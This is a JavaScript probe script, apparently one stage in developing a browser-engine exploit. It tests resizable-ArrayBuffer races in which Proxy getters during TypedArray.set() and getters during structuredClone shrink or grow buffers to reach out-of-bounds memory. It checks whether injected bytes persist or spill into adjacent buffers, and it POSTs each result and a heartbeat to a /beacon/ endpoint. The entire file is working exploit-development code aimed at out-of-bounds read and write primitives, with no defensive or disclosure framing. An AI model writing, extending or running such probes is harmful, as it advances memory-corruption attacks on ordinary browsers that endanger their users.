/* p75-persist — Read W2-written OOB bytes WITHOUT growing back
 * V74X showed: W2 write succeeds but grow-back zeroes. So:
 * Strategy: W2 write → TOCTOU clone read (no grow) → see our bytes?
 *
 * Also test: fixed-length views, DataView at OOB offset, second RAB sharing.
 * Beacon prefix: V75P-
 */
(function(){
"use strict";
var RUN_ID = "v75p" + Math.random().toString(36).slice(2,12);
var PREFIX = "V75P-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,900)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press75-persist W2 write + read without grow");

/* ====== P1: W2 write then TOCTOU read (no grow) ====== */
function test_P1() {
  var r = {};
  try {
    var rab = new ArrayBuffer(512, { maxByteLength: 512 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 512; i++) u8[i] = 0xAA;

    // Step 1: W2 write — shrink to 32, write 256 bytes at offset 64
    var src = new Uint8Array(256);
    for (var j = 0; j < 256; j++) src[j] = 0x42 + (j % 10); // B,C,D,E,F,G,H,I,J,K pattern

    var triggered = false;
    var proxySrc = new Proxy(src, {
      get: function(t, prop) {
        if (prop === '0' && !triggered) {
          triggered = true;
          rab.resize(32);
        }
        return t[prop];
      }
    });

    try {
      u8.set(proxySrc, 64);
      r.writeOK = true;
    } catch(e) {
      r.writeErr = e.message.slice(0,50);
    }

    r.rabSizeAfterWrite = rab.byteLength; // should be 32

    // Step 2: TOCTOU clone read — DON'T grow, just clone while shrunk
    // We need to grow briefly for the clone to snapshot a larger size,
    // then shrink in the getter. But the grow would zero our writes...
    // ALTERNATIVE: use a SECOND structuredClone trick.

    // Actually: the RAB is at 32 bytes now. TOCTOU needs it bigger to get OOB.
    // What if we clone IMMEDIATELY (before any grow) with a trick?

    // Test: can we read bytes 64+ from a DataView on the shrunk RAB?
    try {
      var dv = new DataView(rab); // length-tracking view
      r.dvLen = dv.byteLength; // should be 32
      try {
        r.dvByte64 = dv.getUint8(64); // should throw — past 32
      } catch(e) { r.dvByte64Err = e.name; }
    } catch(e) { r.dvErr = e.message.slice(0,40); }

    // Test: create a fixed-length view BEFORE shrink, read after?
    // Can't — we already shrunk. But we can test on next RAB.

    // Test: grow to 64 (not 512) — does it zero only 32-63, leaving 64+ intact?
    rab.resize(64);
    r.byte64after64 = u8[64]; // was this zeroed?
    r.byte100after64 = u8[100]; // beyond 64, in the write zone

    // Grow to 128
    rab.resize(128);
    r.byte64after128 = u8[64];
    r.byte100after128 = u8[100];

    // Grow to 256
    rab.resize(256);
    r.byte64after256 = u8[64];
    r.byte100after256 = u8[100];
    r.byte200after256 = u8[200];

    // Grow all the way back
    rab.resize(512);
    r.byte64after512 = u8[64];
    r.byte100after512 = u8[100];
    r.byte200after512 = u8[200];
    r.byte300after512 = u8[300];

    // Check: are ANY of the written bytes non-zero?
    r.anyPersist = r.byte64after64 !== 0 || r.byte100after128 !== 0 ||
                   r.byte200after256 !== 0 || r.byte300after512 !== 0;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("P1-INCREMENTAL-GROW", r);
}

/* ====== P2: Fixed-length view created BEFORE shrink ====== */
function test_P2() {
  var r = {};
  try {
    var rab = new ArrayBuffer(512, { maxByteLength: 512 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 512; i++) u8[i] = 0xAA;

    // Create fixed-length view before any resize
    var fixed = new Uint8Array(rab, 0, 512); // explicitly length=512
    r.fixedLenBefore = fixed.length; // 512

    // W2 write with Proxy shrink
    var src = new Uint8Array(128);
    for (var j = 0; j < 128; j++) src[j] = 0xDD;

    var triggered = false;
    var proxySrc = new Proxy(src, {
      get: function(t, prop) {
        if (prop === '0' && !triggered) {
          triggered = true;
          rab.resize(16);
        }
        return t[prop];
      }
    });

    try {
      u8.set(proxySrc, 64);
      r.writeOK = true;
    } catch(e) {
      r.writeErr = e.message.slice(0,50);
    }

    r.rabAfter = rab.byteLength; // 16

    // Can fixed-length view (which was 512) read bytes at offset 64?
    try {
      r.fixedByte64 = fixed[64]; // RAB is 16, but fixed was created as 512
      r.fixedByte100 = fixed[100];
      r.fixedByte200 = fixed[200];
      // If these are 0xDD → our W2 write persists and fixed view reads it!
      r.FIXED_READS_OOB = fixed[64] === 0xDD;
    } catch(e) {
      r.fixedReadErr = e.message.slice(0,50);
    }

    // Also: can we WRITE through fixed view at OOB offset?
    try {
      fixed[100] = 0xEE;
      r.fixedWrite100 = "OK";
      // Read back through length-tracking view (after grow)
      rab.resize(512);
      r.verifyByte100 = u8[100]; // 0xEE?
    } catch(e) {
      r.fixedWriteErr = e.message.slice(0,50);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("P2-FIXED-VIEW", r);
}

/* ====== P3: Write then TOCTOU-read from a DIFFERENT RAB+view combo ====== */
function test_P3() {
  var r = {};
  try {
    // Two RABs: rabA for writing, rabB for TOCTOU reading
    // If they share backing (they don't, but test), or are adjacent

    // Actually: test if we can create a TypedArray view that spans two RABs
    // (we can't — but test the error)

    // Real test: W2 write into rabA's OOB zone, then create a
    // structuredClone where the getter resizes rabA to LARGER
    // (grow, not shrink) — the clone should snapshot the shrunk size
    // then the getter grows it. Does the clone get the grown data?

    var rab = new ArrayBuffer(32, { maxByteLength: 512 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 32; i++) u8[i] = i;

    // First: manually write to the backing store at offset 64+
    // by growing, writing, then shrinking
    rab.resize(256);
    for (var j = 64; j < 256; j++) u8[j] = 0xBB;
    rab.resize(32); // shrink — data at 64+ should be in backing store

    // Now TOCTOU clone: snapshot 32 bytes, getter GROWS to 256
    var obj = Object.create(null);
    obj.buf = rab;
    Object.defineProperty(obj, 'zz', { enumerable: true, get: function() {
      rab.resize(256); // GROW in getter
      return 1;
    }});

    var cloned = structuredClone(obj);
    r.clonedLen = cloned.buf.byteLength; // snapshotted 32?
    var cv = new Uint8Array(cloned.buf);
    r.clonedByte0 = cv[0];
    if (cloned.buf.byteLength > 64) {
      r.clonedByte64 = cv[64]; // 0xBB from our pre-write?
      r.clonedByte100 = cv[100];
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("P3-GROW-IN-GETTER", r);
}

/* ====== P4: W2 write then read via structuredClone of the written RAB ====== */
function test_P4() {
  var r = {};
  try {
    var rab = new ArrayBuffer(512, { maxByteLength: 512 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 512; i++) u8[i] = 0xAA;

    // Step 1: W2 write at offset 128, shrink to 32
    var src = new Uint8Array(128);
    for (var j = 0; j < 128; j++) src[j] = 0x55;

    var triggered = false;
    var proxySrc = new Proxy(src, {
      get: function(t, prop) {
        if (prop === '0' && !triggered) {
          triggered = true;
          rab.resize(32);
        }
        return t[prop];
      }
    });
    u8.set(proxySrc, 128);
    r.rabAfterW2 = rab.byteLength; // 32

    // Step 2: grow to 512 for TOCTOU
    rab.resize(512);
    r.byte128afterGrow = u8[128]; // check if W2 data survived grow (likely 0)

    // Step 3: TOCTOU clone — shrink in getter
    var obj2 = Object.create(null);
    obj2.buf = rab;
    Object.defineProperty(obj2, 'zz2', { enumerable: true, get: function() {
      rab.resize(16);
      return 1;
    }});
    var cloned = structuredClone(obj2);
    var cv = new Uint8Array(cloned.buf);
    r.clonedLen = cloned.buf.byteLength;
    r.clonedByte128 = cv[128]; // 0x55? or 0?
    r.clonedByte200 = cv[200];

    // The question: did grow-to-512 zero bytes 32-511, wiping our W2 write?
    // Or did the W2 write survive because it's in the same physical page?

  } catch(e) { r.err = e.message.slice(0,80); }
  B("P4-W2-THEN-TOCTOU", r);
}

/* ====== P5: Race — W2 write and TOCTOU read in rapid succession ====== */
function test_P5() {
  var r = {};
  try {
    // What if we DON'T grow between W2 write and TOCTOU read?
    // RAB starts at 512, W2 shrinks to 32, we need to TOCTOU-read at 512.
    // Problem: TOCTOU snapshots current size (32) then getter shrinks further.
    // But RAB is already at 32! Getter can't shrink below 0.

    // Solution: TOCTOU works by snapshot(big) → getter(shrink) → copy(big bytes)
    // We need RAB to be big when TOCTOU snapshots, but have our W2 data in OOB zone.
    // SEQUENCE: grow to 512, W2 write at 128 (shrinks to 32), DON'T grow,
    //           set up TOCTOU that first grows to 512 in a getter THEN shrinks in another

    // Actually simpler: grow → write pattern → shrink → TOCTOU
    var rab = new ArrayBuffer(512, { maxByteLength: 512 });
    var u8 = new Uint8Array(rab);

    // Write our target data at offset 128
    for (var i = 0; i < 512; i++) u8[i] = 0;
    for (var j = 128; j < 256; j++) u8[j] = 0x77;

    // Now shrink
    rab.resize(32);

    // The data at 128-255 (0x77) is now in the OOB zone
    // TOCTOU: grow to 512 in property, then shrink in getter
    // Wait — we need it AT 512 for the snapshot...

    // Try: temporarily grow in the object construction, before structuredClone
    rab.resize(512);

    // Check if 0x77 survived the shrink+grow cycle
    r.byte128afterCycle = u8[128]; // 0x77 or 0?

    if (u8[128] === 0) {
      // Zeroed. Try a different approach: DON'T shrink first, just write and clone.

      // Write marker
      for (var k = 128; k < 256; k++) u8[k] = 0x77;

      // TOCTOU clone — getter shrinks to 32
      var obj = Object.create(null);
      obj.buf = rab;
      Object.defineProperty(obj, 'zz', { enumerable: true, get: function() {
        rab.resize(32);
        return 1;
      }});

      var cloned = structuredClone(obj);
      var cv = new Uint8Array(cloned.buf);
      r.clonedLen = cloned.buf.byteLength;
      r.clonedByte128 = cv[128]; // 0x77!
      r.clonedByte200 = cv[200]; // 0
      r.TOCTOU_READS_WRITTEN = cv[128] === 0x77;
    } else {
      r.SURVIVED_CYCLE = true;
      r.byte128 = u8[128];
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("P5-NO-GROW", r);
}

/* ====== P6: Dual Proxy — write AND read in same set() call ====== */
function test_P6() {
  var r = {};
  try {
    // Can we use W2 to write into one RAB and simultaneously read
    // from an adjacent RAB?

    // Test: two RABs, same size, allocated back-to-back
    var rabA = new ArrayBuffer(256, { maxByteLength: 256 });
    var rabB = new ArrayBuffer(256, { maxByteLength: 256 });
    var uA = new Uint8Array(rabA);
    var uB = new Uint8Array(rabB);

    for (var i = 0; i < 256; i++) {
      uA[i] = 0xAA;
      uB[i] = 0xBB;
    }

    // W2 write into rabA, but source Proxy also reads from rabB
    var src = new Uint8Array(256);
    for (var j = 0; j < 256; j++) src[j] = 0xFF;

    var triggered = false;
    var readFromB = [];
    var proxySrc = new Proxy(src, {
      get: function(t, prop) {
        var idx = parseInt(prop);
        if (!isNaN(idx) && idx >= 0 && idx < 256) {
          readFromB.push(uB[idx]); // read from rabB
        }
        if (prop === '0' && !triggered) {
          triggered = true;
          rabA.resize(8); // shrink A
        }
        return t[prop];
      }
    });

    try {
      uA.set(proxySrc, 0);
      r.setOK = true;
    } catch(e) {
      r.setErr = e.message.slice(0,50);
    }

    r.readFromBCount = readFromB.length;
    // Did any read from B show non-0xBB? (would indicate rabB corruption)
    var bCorrupt = 0;
    for (var k = 0; k < readFromB.length; k++) {
      if (readFromB[k] !== 0xBB) bCorrupt++;
    }
    r.bCorrupt = bCorrupt;

    // Check rabB for corruption from our 0xFF writes
    var bFF = 0;
    for (var m = 0; m < uB.length; m++) {
      if (uB[m] === 0xFF) bFF++;
    }
    r.bFF = bFF;
    r.CROSS_RAB_WRITE = bFF > 0;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("P6-DUAL-RAB", r);
}

/* ====== P7: Test what map() actually returns for OOB indices ====== */
function test_P7() {
  var r = {};
  try {
    var rab = new ArrayBuffer(64, { maxByteLength: 64 });
    var ta = new Uint8Array(rab);
    for (var i = 0; i < 64; i++) ta[i] = 0x41 + (i % 26);

    var oobValues = [];
    var oobRaw = [];

    var mapped = ta.map(function(val, idx, arr) {
      if (idx === 2) rab.resize(4);
      if (idx >= 4) {
        oobValues.push(typeof val + ":" + val);
        oobRaw.push(val);
      }
      // Return a number regardless
      return idx >= 4 ? (val === undefined ? -1 : val) : val;
    });

    r.mappedLen = mapped.length;
    r.oobCount = oobValues.length;
    r.oobSample = oobValues.slice(0, 10).join("|");
    r.mappedType = mapped.constructor.name;

    // What's in the mapped result array?
    var resultSample = [];
    for (var j = 0; j < Math.min(mapped.length, 20); j++) {
      resultSample.push(mapped[j]);
    }
    r.resultSample = resultSample.join(",");

    // Key: does mapped[4+] contain -1 (undefined val) or actual bytes?
    var undefs = 0;
    for (var k = 4; k < mapped.length; k++) {
      if (mapped[k] === -1) undefs++;
    }
    r.undefCount = undefs;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("P7-MAP-DETAIL", r);
}

/* ====== Run ====== */
try {
  test_P1();
  setTimeout(test_P2, 300);
  setTimeout(test_P3, 600);
  setTimeout(test_P4, 900);
  setTimeout(test_P5, 1200);
  setTimeout(test_P6, 1500);
  setTimeout(test_P7, 1800);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe75-done"); }, 16000);
})();
